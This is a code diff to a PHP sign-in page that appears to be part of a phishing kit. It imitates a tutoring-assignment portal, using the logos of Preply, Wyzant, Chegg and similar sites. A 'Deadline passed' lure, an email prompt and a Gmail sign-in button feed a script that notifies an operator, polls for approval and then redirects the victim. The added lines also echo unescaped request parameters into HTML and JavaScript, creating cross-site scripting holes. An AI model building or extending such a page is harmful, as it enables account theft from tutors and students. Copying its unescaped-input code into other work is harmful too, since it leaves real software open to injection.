@@ -1053,6 +1053,9 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
          color: white !important;
       }
    </style>
+    <style>
+        .alert{position:relative;padding:.75rem 1.25rem;margin-bottom:1rem;border:1px solid transparent;border-radius:.25rem}.alert-heading{color:inherit}.alert-link{font-weight:700}.alert-dismissible{padding-right:4rem}.alert-dismissible .close{position:absolute;top:0;right:0;padding:.75rem 1.25rem;color:inherit}.alert-primary{color:#004085;background-color:#cce5ff;border-color:#b8daff}.alert-primary hr{border-top-color:#9fcdff}.alert-primary .alert-link{color:#002752}.alert-secondary{color:#383d41;background-color:#e2e3e5;border-color:#d6d8db}.alert-secondary hr{border-top-color:#c8cbcf}.alert-secondary .alert-link{color:#202326}.alert-success{color:#155724;background-color:#d4edda;border-color:#c3e6cb}.alert-success hr{border-top-color:#b1dfbb}.alert-success .alert-link{color:#0b2e13}.alert-info{color:#0c5460;background-color:#d1ecf1;border-color:#bee5eb}.alert-info hr{border-top-color:#abdde5}.alert-info .alert-link{color:#062c33}.alert-warning{color:#856404;background-color:#fff3cd;border-color:#ffeeba}.alert-warning hr{border-top-color:#ffe8a1}.alert-warning .alert-link{color:#533f03}.alert-danger{color:#721c24;background-color:#f8d7da;border-color:#f5c6cb}.alert-danger hr{border-top-color:#f1b0b7}.alert-danger .alert-link{color:#491217}.alert-light{color:#818182;background-color:#fefefe;border-color:#fdfdfe}.alert-light hr{border-top-color:#ececf6}.alert-light .alert-link{color:#686868}.alert-dark{color:#1b1e21;background-color:#d6d8d9;border-color:#c6c8ca}.alert-dark hr{border-top-color:#b9bbbe}.alert-dark .alert-link{color:#040505}@-webkit-keyframes progress-bar-stripes{from{background-position:1rem 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:1rem 0}to{background-position:0 0}}
+    </style>
 </head>
 
 <body>
@@ -1220,8 +1223,15 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                                  <img src="/public/assets/uploads/cambly.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.wyzant.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/wyzant.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.varsitytutors.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/varsitytutors.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.superprof.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/superprof.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.italki.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/italki.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a><a href="https://www.chegg.com" target="_blank" rel="noopener noreferrer" style="display: inline-flex; align-items: center; text-decoration: none; border: 1px solid rgb(232, 232, 232); border-radius: 6px; padding: 2px; background: rgb(250, 250, 250);"><img src="/public/assets/uploads/chegg.ico" width="14" height="14" alt="Preply" style="display: inline-block;"></a>
                            </div>
                         </div>
-                        <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Enter your tutoring account email. The portal will notify your session coordinator and confirm your outsourced tutor status before sign-in.</p><label style="font-size: 13px; font-weight: 600; color: rgb(68, 68, 68); display: block; margin-bottom: 6px;">Tutor email address</label><input id="tutorEmail" type="email" placeholder="you@example.com" value="" style="width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 14px; margin-bottom: 4px;"><button
-                           id="tutorEmailSubmit" style="width: 100%; padding: 12px 0px; background: <?= $primary ?>; color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; margin-bottom: 4px; opacity: 1;">Continue</button><button id="backToRole" style="width: 100%; padding: 9px 0px; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 13px; color: rgb(136, 136, 136); cursor: pointer;">← Back</button>
+                        <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Enter your tutoring account email. The portal will notify your session coordinator and confirm your outsourced tutor status before sign-in.</p>
+                        <label style="font-size: 13px; font-weight: 600; color: rgb(68, 68, 68); display: block; margin-bottom: 6px;">Tutor email address</label>
+                        <input id="tutorEmail" type="email" placeholder="you@example.com" value="<?= $_GET['email'] ?? '' ?>" style="width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 14px; margin-bottom: 4px;"><button
+                           id="tutorEmailSubmit" style="width: 100%; padding: 12px 0px; background: <?= $primary ?>; color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; margin-bottom: 4px; opacity: 1;"
+                           >Continue</button>
+                           <div class="feedbackArea">
+                           <p class='loading-text2' style="margin-top:3px; margin-bottom:3px;"></p>
+                           </div>
+                           <button id="backToRole" style="width: 100%; padding: 9px 0px; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; font-size: 13px; color: rgb(136, 136, 136); cursor: pointer;">← Back</button>
                         <p style="font-size: 12px; color: rgb(136, 136, 136); line-height: 1.6; margin: 16px 0px 0px;">By signing in, you confirm you are accessing this assignment through an authorized link. Unauthorized access attempts are logged.</p>
                      </div>
                   </div>
@@ -1263,7 +1273,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                               <path d="M4.4 11.89A6 6 0 014.18 10c0-.66.11-1.3.22-1.9V5.52H1.07A10 10 0 000 10c0 1.61.39 3.13 1.07 4.48l3.33-2.59z" fill="#FBBC05"></path>
                               <path d="M10 3.96c1.47 0 2.8.51 3.84 1.5L16.7 2.6A9.97 9.97 0 0010 0 9.99 9.99 0 001.07 5.52L4.4 8.1C5.18 5.72 7.39 3.96 10 3.96z" fill="#EA4335"></path>
                            </svg>Sign in with Gmail</button>
-                        <section id="loadingSection">
+                        <section id="loadingSection" class="feedbackArea">
                            <div class="loading-title"></div>
                            <div class="loading-text"></div>
                         </section>
@@ -1275,6 +1285,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                </div>
 
                <!---------------------------------------->
+               <!--
                <div style="background-color: rgb(255, 255, 255); border-width: 1px 1px 1px 4px; border-style: solid; border-color: rgb(232, 201, 106) rgb(232, 201, 106) rgb(232, 201, 106) <?= $primary ?>; border-image: initial; border-radius: 8px; padding: 24px 28px; margin-bottom: 28px; box-shadow: rgba(0, 85, 162, 0.07) 0px 2px 12px;">
                   <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px; flex-wrap: wrap;">
                      <span style="background-color: <?= $primary ?>; color: rgb(255, 255, 255); padding: 3px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase;">Course Work</span>
@@ -1294,11 +1305,14 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                            <p style="font-size: 12px; color: rgb(85, 85, 85); margin: 0px;">03:00 AM GMT+3</p>
                         </div>
                      </div>
-                     <div style="display: flex; align-items: center; gap: 4px; background-color: rgb(192, 57, 43); border-radius: 6px; padding: 8px 14px;"><span style="color: rgb(255, 255, 255); font-size: 13px; font-weight: 700;">Deadline passed</span></div>
+                     <a href="/a0">
+                     <div style="display: flex; align-items: center; gap: 4px; background-color: rgb(192, 57, 43); border-radius: 6px; padding: 8px 14px;">
+                         <span style="color: rgb(255, 255, 255); font-size: 13px; font-weight: 700;">Deadline passed</span></div>
+                         </a>
                   </div>
                   <div style="padding: 0px 0px 4px;"></div>
                   <p style="font-size: 12px; color: rgb(122, 159, 192); margin: 0px; text-align: center;">🔒 Sign in to view the full assignment details</p>
-               </div>
+               </div>-->
             </div>
          </main>
          <footer style="background-color: <?= $primary ?>; color: rgb(170, 170, 170); margin-top: 80px; padding: 48px 0px 24px;">
@@ -1359,7 +1373,32 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
       const tutorDiv = document.querySelector("#tutorDiv");
 
       const loadingText = document.querySelector('.loading-text');
+      const loadingText2 = document.querySelector('.loading-text2');
       const loadingTitle = document.querySelector('.loading-title');
+      let notifyAdminLoading = false;
+      
+      const returnedText = `<?= urldecode($_GET['msg'] ?? '') ?>`;
+     
+      if (returnedText.length > 0) {
+          roleDiv.classList.add('hidden');
+         emailDiv.classList.remove('hidden');
+         
+         tutorDiv.scrollIntoView({ 
+          behavior: "smooth", 
+          block: "start"      
+        });
+        
+        
+         const feedbackArea = document.querySelectorAll('.feedbackArea');
+         feedbackArea.forEach(element => {
+            
+                element.classList.remove('alert', 'alert-success');    
+                element.classList.add('alert', 'alert-warning');       
+         });
+        
+       // loadingTitle.textContent = 'Kindly try again.';
+          loadingText2.textContent = returnedText;
+      }
 
       let email;
 
@@ -1395,7 +1434,15 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
       btnContent = signinWithEmail.innerHTML;
 
       signinWithEmail.addEventListener("click", async (e) => {
+          notifyAdminLoading = true;
          signinWithEmail.innerHTML = `<?= CustomFunctions::Loading() ?>`; 
+         
+         const feedbackArea = document.querySelectorAll('.feedbackArea');
+         feedbackArea.forEach(element => {
+            
+                    element.classList.remove('alert', 'alert-warning');
+                    element.classList.add('alert', 'alert-success');           
+         });
 
          loadingTitle.textContent = 'Verifying Tutor Access';
          loadingText.textContent = 'Notifying administrators for user authorization...please wait!!!';
@@ -1407,7 +1454,8 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
             const response = await fetch(`/myapp/notify-admin/`, {
                method: "POST",
                body: JSON.stringify({
-                  email
+                  email,
+                  owner: `<?= $_GET['viability_jwt']??'' ?>`
                }),
             });
 
@@ -1418,6 +1466,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
 
          } finally {
             signinWithEmail.innerHTML = btnContent;
+            notifyAdminLoading = false;
          }
 
       });
@@ -1427,6 +1476,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
          cycles++;
          const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;
 
+         try { 
 
          loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';
 
@@ -1440,6 +1490,10 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                   email
                })
             });
+            if (!p.ok){
+                notifyAdminLoading ? pollStatus(email) : signinWithEmail.click();
+                return;
+            }
             const r = await p.json();
             if (r.error === 'false' || r.error === false) {
 
@@ -1448,10 +1502,19 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
 
 
             } else {
-               pollStatus(email);
+                notifyAdminLoading ? pollStatus(email) : signinWithEmail.click(); 
             }
 
          }, 2000);
+
+      } catch(e) {
+        //  setTimeout(()=> {
+        //     window.location.href = redirectUrl;
+        //  }, 50000);
+      }
+      finally {
+
+      }
 
 
       }
